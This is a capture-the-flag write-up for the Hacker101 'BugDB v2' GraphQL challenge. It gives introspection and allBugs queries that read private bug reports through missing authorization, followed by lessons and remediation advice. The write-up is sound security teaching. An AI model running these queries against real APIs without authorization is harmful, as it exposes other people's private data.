# BugDB v2 — Writeup (1/1)

**Difficulty:** Easy  
**Category:** Web, GraphQL  
**Flags:** 1/1 (complete)  
**Platform:** Hacker101 CTF  
**Hint:** "What has changed since last version?"

---

## Challenge Overview

**Context:** Second version of the GraphQL bug reports API. The developer "fixed" some things from v1, but the schema changed in a way that created a new, even more direct access route to private bugs.

**What you face:** The same GraphQL API, but with a slightly different schema. The `allUsers` endpoint may no longer exist, but `allBugs` was added — and it returns bugs from all users, including private ones, without authentication.

**Vulnerabilities exploited:**
- Unrestricted GraphQL Introspection (OWASP API9) — reveals the new schema including `allBugs`
- Broken Object Level Authorization / BOLA (CWE-639) — `allBugs` exposes private bugs from all users without authentication
- Accidental data exposure via schema change — the "fix" created a new leak

**What you learn:**
- GraphQL schema changes can introduce new vulnerabilities even while fixing old ones
- `allBugs` with `private` and `text` fields and no authorization filter = direct exfiltration
- Always retest after API refactoring: the vector changes, the vulnerability remains
- Introspection quickly reveals what changed between versions of the same API

---

## Objective

Adapt BugDB v1 queries to the new schema to extract private bug reports.

## Differences from v1

- Some fields were renamed or removed
- New `allBugs` endpoint exposed directly
- `user` query restructured (relationship with bugs modified)
- Same authorization problem remains

---

## Flag 0 — Query Adaptation + allBugs

### Step 1: Check what changed with introspection

Use the same introspection queries from v1 to map the new schema:

```graphql
query {
  __schema {
    types {
      name
    }
  }
}
```

Compare available types with v1 to identify what was added/removed.

### Step 2: User query (adapted)

```graphql
query {
  allUsers {
    edges {
      node {
        id
        username
      }
    }
  }
}
```

### Step 3: Direct query for all bugs

In v2, the `allBugs` endpoint exposes data directly without going through users:

```graphql
query {
  allBugs {
    reporter {
      id
      username
    }
    private
    text
    reporterId
  }
}
```

The `text` field of private bugs (`private: true`) contains the flag.

### Step 4: Combined query (if needed)

```graphql
{
  user {
    edges {
      node {
        id
        username
        bugs {
          edges {
            node {
              text
              private
              reporter {
                id
              }
            }
          }
        }
      }
    }
  }
  allBugs {
    reporter {
      id
    }
    reporterId
    id
    text
    private
  }
}
```

---

## Attack Strategy

1. Try the v1 queries exactly — some will likely fail with errors
2. Use the error messages to understand what changed in the schema
3. Adapt the queries using introspection of the new schema
4. Explore the new `allBugs` endpoint that exposes data more directly

---

## Lessons Learned

1. **Schema updates** do not automatically fix authorization problems
2. **New endpoints** introduced in updated versions may be less protected
3. **Version comparison** reveals new or simplified attack vectors
4. **GraphQL error messages** help identify schema changes

## Remediation

- Same recommendations as v1: disable introspection, add field-level authorization
- Review **all new endpoints** added during schema refactoring
- Treat a version update as an attack surface change, not just an improvement
